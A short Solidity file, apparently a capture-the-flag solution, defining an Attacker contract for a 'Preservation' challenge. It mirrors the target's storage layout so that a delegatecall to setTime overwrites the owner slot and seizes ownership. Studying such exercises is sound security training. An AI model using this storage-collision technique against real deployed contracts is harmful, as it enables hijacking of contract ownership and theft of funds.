// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "../Preservation.sol";

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    uint256 storedTime;
    address public owner;

    constructor() {}

    function setTime(uint256 _time) public {
        owner = msg.sender;
        _time;
    }
}
